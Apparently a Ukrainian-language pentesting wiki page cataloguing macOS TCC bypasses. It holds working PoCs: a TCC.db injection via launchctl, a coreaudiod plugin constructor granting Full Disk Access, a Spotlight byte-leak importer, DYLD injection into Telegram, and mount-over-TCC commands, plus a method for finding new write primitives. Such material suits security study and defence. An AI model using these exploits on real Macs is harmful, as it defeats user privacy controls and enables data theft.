# Обхід TCC у macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## За функціональністю

### Write Bypass

Це не обхід, а просто принцип роботи TCC: **він не захищає від запису**. Якщо Terminal **не має доступу до читання Desktop користувача, він усе одно може записувати туди**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Атрибут **`com.apple.macl`** додається до нового **файлу**, щоб надати **застосунку, який його створив**, доступ для читання.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Можна **розмістити вікно поверх запиту TCC**, щоб змусити користувача **погодитися** непомітно для нього. PoC можна знайти в [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Запит TCC від довільного імені

Зловмисник може **створювати застосунки з будь-яким ім’ям** (наприклад, Finder, Google Chrome...) у файлі **`Info.plist`** і змусити їх запитувати доступ до захищеного TCC розташування. Користувач думатиме, що доступ запитує легітимний застосунок.\
Крім того, можна **прибрати легітимний застосунок із Dock і розмістити там підроблений**, щоб під час натискання на нього (який може використовувати ту саму іконку) він міг викликати легітимний застосунок, запитати дозволи TCC і запустити malware, змусивши користувача повірити, що доступ запитав легітимний застосунок.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Додаткова інформація та PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

За замовчуванням доступ через **SSH мав «Full Disk Access»**. Щоб вимкнути його, потрібно залишити його у списку, але вимкнути (видалення зі списку не прибере ці привілеї):<sup>[[2]](#references)</sup>

![Запит TCC від довільного імені — SSH Bypass: за замовчуванням доступ через SSH мав «Full Disk Access». Щоб вимкнути його, потрібно залишити його у списку, але вимкнути (видалення зі списку...](<../../../../../images/image (1077).png>)

Тут наведено приклади того, як деяким **malware вдалося обійти цей захист**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Зверніть увагу: тепер, щоб увімкнути SSH, потрібен **Full Disk Access**

### Обробка розширень — CVE-2022-26767

Атрибут **`com.apple.macl`** надається файлам, щоб надати **певному застосунку дозвіл читати їх.** Цей атрибут встановлюється, коли файл **перетягують на застосунок** або коли користувач **двічі клацає** файл, щоб відкрити його за допомогою **програми за замовчуванням**.

Отже, користувач може **зареєструвати шкідливий застосунок** для обробки всіх розширень і викликати Launch Services, щоб **відкрити** будь-який файл (і надати шкідливому файлу доступ для читання).<sup>[[23]](#references)</sup>

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** дає змогу взаємодіяти із сервісом XPC **`com.apple.iCloudHelper`**, який **надає токени iCloud**.

**iMovie** і **Garageband** мали цей та інші entitlements, що надавали відповідні дозволи.

Щоб дізнатися більше про експлойт для **отримання токенів iCloud** за допомогою цього entitlement, перегляньте доповідь: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" — Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Витік даних через імена Darwin notifications імпортера Spotlight

Імпортер Spotlight може читати файл, який Spotlight передає його callback-функції `GetMetadataForFile`, навіть якщо звичайний процес без Full Disk Access не може прочитати цей файл. На відміну від [ін’єкції коду в процес, авторизований TCC](../macos-tcc-credential-and-data-theft.md), для цього потрібна локальна присутність, що дає змогу встановити імпортер, і відповідна подія індексування Spotlight. Імпортер працює в sandbox, але Darwin notifications, що містять лише ім’я, можуть передавати байти слухачеві поза цим sandbox. Це канал data-leak, а не спосіб отримати root або довільний доступ до файлів з імпортера.<sup>[[24]](#references)</sup>

Укажіть тип цільового файлу в `CFBundleDocumentTypes` → `LSItemContentTypes` у файлі `Info.plist` імпортера, а потім установіть bundle у `~/Library/Spotlight/` або `Contents/Library/Spotlight/` застосунку. Перевірте реєстрацію командою `mdimport -L`. У [розділі про імпортери Spotlight](../../../../macos-auto-start-locations.md#spotlight-plugins) описано розміщення bundle та зіставлення типів файлів. Імпортер отримує лише ті файли, для яких його вибирає Spotlight; наявний імпортер зазвичай має перевагу. У macOS 26 Tahoe команда `mdimport -i` у тестах не завжди надійно запускала негайне рекурсивне індексування, тоді як `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` запитувала повторний імпорт UTI, заявлених цим імпортером.<sup>[[24]](#references)</sup>

Щоб перевірити канал, запустіть слухач поза sandbox командою `notifyutil -w TEST_TEST_TEST`, а потім надішліть notification за допомогою `CFNotificationCenterGetDarwinNotifyCenter()` із `NULL` для об’єкта та `userInfo`. На відміну від distributed notification із даними в `userInfo`, Darwin notification містить лише своє ім’я. Для двійкових даних зареєструйте зовнішній слухач для десяткових імен від `0` до `255` за допомогою `notify_register_dispatch`; зіставте реєстрацію кожного callback із відповідним значенням байта. У `GetMetadataForFile` читайте лише `pathToFile`, переданий Spotlight, і надсилайте кожен байт як десяткове ім’я notification:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Слухач відновлює послідовність байтів, а не читає сам файл, захищений TCC. Опублікований PoC відновив перші 64 байти `knowledgeC.db` з термінала без FDA, коли SIP був увімкнений у macOS 26. Це низькошвидкісний і ненадійний спосіб масового копіювання: Spotlight може не індексувати цільовий файл або не переіндексувати його, а паралельні екземпляри імпортера можуть перемішувати потоки сповіщень. Інші механізми обходу меж пісочниці див. у [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/).<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Автоматизація

Застосунок із дозволом **`kTCCServiceAppleEvents`** зможе **керувати іншими застосунками**. Це означає, що він зможе **зловживати дозволами, наданими іншим застосункам**.<sup>[[2]](#references)</sup>

Докладніше про Apple Scripts:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Наприклад, якщо застосунок має **дозвіл на автоматизацію для `iTerm`**, то в цьому прикладі **`Terminal`** має доступ до iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Для iTerm

Terminal, який не має FDA, може викликати iTerm, у якого цей дозвіл є, і використовувати його для виконання дій:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Через Finder

Або якщо застосунок має доступ через Finder, він може виконати скрипт, наприклад такий:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## За поведінкою застосунку

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Користувацький **демон tccd** використовував змінну **`HOME`** **env** для доступу до бази даних користувачів TCC за шляхом: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Згідно з [цією публікацією на Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), оскільки демон TCC запускається через **`launchd`** у домені поточного користувача, можна **керувати всіма змінними середовища**, що йому передаються.<sup>[[19]](#references)</sup>\
Отже, **зловмисник може задати змінну середовища `$HOME`** у **`launchctl`**, вказавши на **контрольований** **каталог**, **перезапустити** демон **TCC**, а потім **безпосередньо змінити базу даних TCC**, щоб надати собі **всі доступні права TCC** без запиту підтвердження від кінцевого користувача.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes мав доступ до захищених TCC розташувань, але щойно створена нотатка **зберігалася в незахищеному розташуванні**. Тому зловмисник міг попросити Notes скопіювати захищений файл у нотатку, а потім отримати доступ до отриманих даних у незахищеному розташуванні:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Бінарний файл `/usr/libexec/lsd` із бібліотекою `libsecurity_translocate` мав entitlement `com.apple.private.nullfs_allow`, який дозволяв йому створювати монтування **nullfs**, а також entitlement `com.apple.private.tcc.allow` із **`kTCCServiceSystemPolicyAllFiles`** для доступу до кожного файлу.

Можна було додати атрибут quarantine до "Library", викликати XPC-сервіс **`com.apple.security.translocation`**, після чого Library монтувалася за шляхом **`$TMPDIR/AppTranslocation/d/d/Library`**, звідки можна було **отримати доступ** до всіх документів у Library.

### CVE-2024-44131 - FileProvider symlink race

Програми, які передають файлові операції **привілейованому helper-процесу** (у цьому випадку **`fileproviderd`** / **`Files.app`**), копіюють або переміщують елементи **від імені користувача**, тому копіювання виконується з привілеями helper-процесу, а не викликувача.

Jamf Threat Labs показали, що перевірку symlink, яка виконується перед операцією, можна **обійти за допомогою race condition**: замість створення symlink для **останнього** компонента шляху (який перевіряється), зловмисник підміняє **проміжний** каталог шляху **після початку копіювання**. Тоді привілейований helper-процес переходить за посиланням, контрольованим зловмисником, і читає/записує дані в захищені TCC розташування, **навіть не показуючи запиту на дозвіл**.<sup>[[5]](#references)</sup>

Найпростіші цілі — каталоги, шлях до яких **не** містить випадкового UUID (наприклад, `~/Library/Mobile Documents/com~apple~CloudDocs`), оскільки зловмисник може передбачити повний шлях для race condition.

> [!TIP]
> Ось загальна схема, на яку варто звертати увагу: **будь-який привілейований процес, який розв'язує шлях більше одного разу** (перевірка з подальшим використанням або окреме розв'язання шляхів джерела й призначення у `rename()`/`copyfile()`), можна атакувати через race condition, підмінивши каталог посередині шляху. Вікно для атаки закривають лише `O_NOFOLLOW_ANY`, `openat()` для вже відкритого FD каталогу або `realpath()` із повторною перевіркою.

Докладніше — у [**публікації Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` можна зібрати з `SQLITE_ENABLE_SQLLOG`, що додає механізм логування, керований змінними середовища ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – для **кожної відкритої бази даних** у `path` записуються **копія файлу бази даних** і журнал SQL-інструкцій (каталог має вже існувати).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – щоразу під час відкриття/підключення бази даних створювати **нову копію**, а не повторно використовувати наявну.
- **`SQLITE_SQLLOG_CONDITIONAL`** – журналювати з’єднання, лише якщо поруч із головною базою даних є файл `<database>-sqllog`.

Якщо вам вдасться впровадити цю змінну в процес, який має **FDA** і відкриває бази даних SQLite, він без проблем **скопіює ці захищені бази даних** у каталог, який ви контролюєте. Оскільки ім’я цільового файлу формується на основі даних, контрольованих зловмисником, **symlink, створений за шляхом призначення**, перетворює цей механізм на **запис у довільний файл** із привілеями цільового процесу.

### **SQLITE_AUTO_TRACE**

Якщо встановлено змінну середовища **`SQLITE_AUTO_TRACE`**, бібліотека **`libsqlite3.dylib`** почне **журналювати** всі SQL-запити. Цю бібліотеку використовували багато програм, тому можна було журналювати всі їхні SQL-запити.<sup>[[22]](#references)</sup>

Кілька програм Apple використовували цю бібліотеку для доступу до захищеної TCC інформації.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Пошук запису файлів, керованого змінними середовища

Два попередні приклади — це випадки застосування однієї загальної техніки, тож варто пошукати й інші: **фреймворки, завантажені в застосунки з привілеями TCC, часто надають змінні середовища для налагодження/ведення журналу, через які процес створює файл за шляхом, контрольованим користувачем**.

Алгоритм пошуку:

1. Виберіть ціль із FDA або іншим цінним дозволом TCC (`Music`, `TV`, `Terminal`, агенти MDM...) і перегляньте фреймворки, з якими вона пов’язана (`otool -L`, `vmmap`).
2. Знайдіть у цих фреймворках рядки `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Задайте можливі змінні за допомогою `launchctl setenv NAME /path/you/control`, запустіть застосунок і стежте за його діями у файловій системі через `fs_usage -w -f filesys <pid>` або `sudo fs_usage | grep <path>`.
4. Якщо процес **створює або перейменовує** файл у вашому каталозі, ви отримали примітив запису: вкажіть як призначення символічне посилання (або влаштуйте гонку для проміжного каталогу, як у CVE-2024-44131 вище), щоб перенаправити запис у `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Цю техніку обмежують два чинники. По-перше, **змінні `DYLD_*` ігноруються для бінарних файлів із hardened runtime**, якщо застосунок не має entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) («логічне значення, яке вказує, чи може на застосунок впливати змінні середовища dynamic linker, які можна використовувати для ін’єкції коду в процес застосунку») — див. також [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). По-друге, Apple видаляє окремі змінні налагодження фреймворків після повідомлень про них, тож змінна, яка працювала в одному випуску macOS, часто зникає в наступному. Якщо після її встановлення застосунок мовчки відмовляється запускатися, вважайте, що цю змінну вже відфільтровано.<sup>[[7]](#references)[[8]](#references)</sup>

Див. [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md), де описано аналогічний трюк зі змінними linker.

### Apple Remote Desktop

Як root, ви можете ввімкнути цю службу, і **ARD agent матиме повний доступ до диска**. Потім користувач може скористатися цим, щоб змусити його скопіювати нову **базу даних TCC користувача**.

## Через **NFSHomeDirectory**

TCC використовує базу даних у теці HOME користувача, щоб контролювати доступ до ресурсів, специфічних для цього користувача: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Отже, якщо користувачеві вдасться перезапустити TCC зі змінною середовища $HOME, що вказує на **іншу теку**, він зможе створити нову базу даних TCC у **/Library/Application Support/com.apple.TCC/TCC.db** і змусити TCC надати будь-який дозвіл TCC будь-якому застосунку.

> [!TIP]
> Зверніть увагу: Apple використовує значення атрибута **`NFSHomeDirectory`**, збережене в профілі користувача, як значення **`$HOME`**. Тож якщо ви скомпрометуєте застосунок, що має дозвіл змінювати цей атрибут (**`kTCCServiceSystemPolicySysAdminFiles`**), цей варіант можна **використати як зброю** для обходу TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Перший POC** використовує [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) і [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/), щоб змінити теку **HOME** користувача.

1. Отримайте blob _csreq_ для цільового застосунку.
2. Створіть фальшивий файл _TCC.db_ із потрібним дозволом і blob _csreq_.
3. Експортуйте запис користувача з Directory Services за допомогою [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Змініть запис Directory Services, щоб змінити домашню теку користувача.
5. Імпортуйте змінений запис Directory Services за допомогою [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Зупиніть _tccd_ користувача й перезапустіть процес.

У другому POC використовувався **`/usr/libexec/configd`**, який мав `com.apple.private.tcc.allow` зі значенням `kTCCServiceSystemPolicySysAdminFiles`.\
`configd` можна було запустити з параметром **`-t`**, що давав зловмиснику змогу вказати **власний Bundle для завантаження**. Тому експлойт **замінив** методи **`dsexport`** і **`dsimport`** для зміни домашньої теки користувача на **ін’єкцію коду в `configd`**.

Докладніше див. [**оригінальний звіт**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Через ін’єкцію в процес

Існують різні техніки для ін’єкції коду в процес і зловживання його привілеями TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Крім того, найпоширеніший спосіб ін’єкції в процес для обходу TCC — це **plugins (load library)**.\
Plugins — це додатковий код, зазвичай у вигляді бібліотек або plist, який **завантажує головний застосунок** і виконує в його контексті. Тому, якщо головний застосунок має доступ до файлів, обмежених TCC (через надані дозволи або entitlements), **власний код також матиме цей доступ**.

### CVE-2020-27937 - Directory Utility

Застосунок `/System/Library/CoreServices/Applications/Directory Utility.app` мав entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, завантажував plugins із розширенням **`.daplug`** і **не використовував hardened runtime**.

Щоб використати цю CVE, **`NFSHomeDirectory`** **змінюють** (зловживаючи попереднім entitlement), щоб **перехопити базу даних TCC користувача** й обійти TCC.

Докладніше див. [**оригінальний звіт**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Бінарний файл **`/usr/sbin/coreaudiod`** мав entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.private.tcc.manager`. Перший **дозволяв ін’єкцію коду**, а другий надавав йому доступ до **керування TCC**.

Цей бінарний файл дозволяв завантажувати **сторонні plug-ins** із теки `/Library/Audio/Plug-Ins/HAL`. Отже, можна було **завантажити plugin і зловживати дозволами TCC** за допомогою цього PoC:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Щоб дізнатися більше, перегляньте [**оригінальний звіт**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Плагіни рівня абстракції пристроїв (DAL)

Системні програми, які відкривають відеопотік камери через Core Media I/O (програми з **`kTCCServiceCamera`**), завантажують **у процесі ці плагіни**, розташовані в `/Library/CoreMediaIO/Plug-Ins/DAL` (на них не поширюються обмеження SIP).

Щоб **впровадити код**, достатньо зберегти там бібліотеку зі звичайним **constructor**.

Кілька програм Apple були вразливими до цього.

### Firefox

Програма Firefox мала entitlements `com.apple.security.cs.disable-library-validation` і `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Докладніше про те, як легко це експлуатувати, дивіться в [**оригінальному звіті**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Бінарний файл `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` мав ентайтлменти **`com.apple.private.tcc.allow`** і **`com.apple.security.get-task-allow`**, що дозволяло впроваджувати код у процес і використовувати привілеї TCC.

### CVE-2023-26818 - Telegram

Telegram мав ентайтлменти **`com.apple.security.cs.allow-dyld-environment-variables`** і **`com.apple.security.cs.disable-library-validation`**, тож його можна було використати, щоб **отримати доступ до його дозволів**, наприклад для запису з камери. [**Payload можна знайти в writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Зверніть увагу: щоб завантажити бібліотеку за допомогою змінної середовища, було створено **власний plist** для впровадження цієї бібліотеки, а для її запуску використали **`launchctl`**:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Через виклики open

Можна викликати **`open`**, навіть перебуваючи в sandbox

### Скрипти Terminal

Досить поширено надавати Terminal **Повний доступ до диска (FDA)**, принаймні на комп’ютерах, якими користуються технічні фахівці. Також можна запускати за його допомогою скрипти **`.terminal`**.

Скрипти **`.terminal`** — це plist-файли, як-от цей, із командою для виконання в ключі **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Застосунок міг записати скрипт термінала в таке розташування, як /tmp, і запустити його за допомогою команди на кшталт:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Через монтування

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Будь-який користувач** (навіть без привілеїв) може створити й змонтувати знімок Time Machine та **отримати доступ до ВСІХ файлів** цього знімка.\
**Єдиний потрібний привілей** — щоб програма, яка використовується (наприклад, `Terminal`), мала доступ **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), який має надати адміністратор.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Детальніше пояснення можна [**знайти в оригінальному звіті**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 — Монтування поверх файла TCC

Навіть якщо файл TCC DB захищений, було можливо **змонтувати поверх каталогу** новий файл TCC.db:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Перевірте **повний exploit** у [**оригінальному описі**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Як пояснено в [оригінальному описі](https://www.kandji.io/blog/macos-audit-story-part2), ця CVE використовувала `diskarbitrationd`.<sup>[[16]](#references)</sup>

Функція `DADiskMountWithArgumentsCommon` із публічного фреймворку `DiskArbitration` виконувала перевірки безпеки. Однак їх можна було обійти, викликавши безпосередньо `diskarbitrationd`, а отже, використавши елементи `../` у шляху та символічні посилання.

Це дозволяло зловмиснику монтувати довільні томи в будь-яке місце, зокрема поверх бази даних TCC, завдяки entitlement `com.apple.private.security.storage-exempt.heritable` у `diskarbitrationd`.

### asr

Інструмент **`/usr/sbin/asr`** дозволяв копіювати весь диск і монтувати його в іншому місці, обходячи захист TCC.

### CVE-2022-22655 - Служби геолокації

Служби геолокації зберігаються **не** в базі даних TCC, як інші служби. Ними керує `locationd`, який зберігає власний список дозволів у **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Кожен запис ідентифікується клієнтом (bundle ID або шляхом до виконуваного файла) і містить такі поля, як `Authorized`, `BundleId`, `Executable` та `Registered`.<sup>[[4]](#references)</sup>

Сам файл `clients.plist` захищений Sandbox/TCC, і його не можна редагувати навіть із правами root — але **каталог `/var/db/locationd/` не був захищений від монтування**. Тож зловмисник із правами root міг створити образ диска зі своїм файлом `clients.plist` (у якому його бінарний файл позначено як `Authorized`), змонтувати його поверх каталогу й перезапустити `locationd`, щоб підроблений список дозволів набув чинності.<sup>[[3]](#references)</sup>

> [!TIP]
> Це той самий принцип, що й у наведених вище обходах TCC за допомогою `hdiutil`/`mount`: захищено *файл*, але не *каталог, у якому він міститься*, тож ви замінюєте весь каталог, а не файл.

## Через програми автозапуску


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Через grep

У деяких випадках файли зберігатимуть конфіденційну інформацію, як-от адреси електронної пошти, номери телефонів, повідомлення тощо, у незахищених місцях (що вважається вразливістю в Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Синтетичні кліки

Тепер це не працює, але [**раніше працювало**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Ще один спосіб — за допомогою [**подій CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: обхід механізму Transparency, Consent, and Control (TCC) у macOS](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Обхід захисту конфіденційності користувачів macOS за допомогою TCC: випадково й навмисно](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
